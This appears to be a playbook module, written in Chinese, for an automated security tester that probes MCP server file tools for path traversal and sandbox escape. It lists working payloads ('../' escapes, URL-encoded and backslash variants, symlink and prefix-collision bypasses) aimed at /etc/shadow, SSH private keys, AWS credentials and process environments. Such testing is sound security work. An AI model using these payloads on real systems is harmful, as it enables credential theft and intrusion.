# path_traversal

## When to use
Tool 名/描述含 `file` `read` `config` `download` `open`; 参数名含 `path` /
`filename` / `filepath` / `document`; 或 resource URI 支持路径参数。

## Objective
读取**根路径外或系统敏感位置**的文件并让内容回流; 声明沙箱根时在根外写入/读回。
判据: `leaks_etc_passwd` / `leaks_shadow_hash` / `leaks_ssh_private_key`;
沙箱场景 `sandbox_escape_write` / `sandbox_escape_read`。
> 白名单验因, 命中不免: 有前缀检查的 tool 才是最值得打的面。

## Playbook
1. `list_tools` 挑一个读文件的 tool, 读输入 schema。
2. 显然合法的路径 (`/tmp/hello.txt`, `./README.md`) 确认它真读本地文件。
3. 依次: 绝对路径 → `../` 逃逸 → URL 编码 (`%2e%2e%2f`) → `\\` 反斜杠变体。
4. 目标优先级: `/etc/passwd` → `/etc/shadow` → `/root/.ssh/id_rsa` →
   `~/.aws/credentials` → `/proc/1/environ`。
5. 有前缀白名单/沙箱根时按最可能绕过面:
   a. **链接面** (最常见): 先 `list` 沙箱内 symlink / junction / 挂载点, 读或列
      链接目标即越界 (Windows junction 免管理员可建);
   b. **前缀碰撞**: 同名相邻目录 (`<root>2`, `<root>-backup`) 常被前缀匹配误放行;
   c. `..` + `//` / `\\` / `%00` / 大小写变体。
6. 部署声明沙箱根 (`EXCEL_FILES_PATH` 或 `--sandbox-root`) 时直接**根外**建
   marker 再读回: 写成功 = `sandbox_escape_write` (high), 读回 =
   `sandbox_escape_read` (high)。

## Templates
- `../../../../etc/passwd`
- `/etc/passwd`
- `..\\..\\..\\etc\\shadow`
- `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `/root/.ssh/id_rsa`
- `/root/mcpwn_marker.xlsx` (沙箱根外写入+读回)
- `../../mcpwn_marker.xlsx`
- `..\\..\\mcpwn_marker.xlsx`
